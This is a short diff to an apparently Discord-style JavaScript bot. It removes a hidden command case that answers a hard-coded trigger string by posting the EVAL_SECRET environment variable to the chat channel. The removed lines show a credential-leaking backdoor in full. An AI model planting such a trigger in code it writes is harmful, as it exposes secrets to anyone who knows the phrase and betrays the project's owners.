@@ -631,9 +631,7 @@ globalThis.bot = () => {
           }
           break;
 
-        case "wxnd-9344-msld-ks13":
-          msg.channel.send(module.require("process").env.EVAL_SECRET)
-          break;
+
           
         case 'timeout':
           const intArgs = msg.content.split(' ')
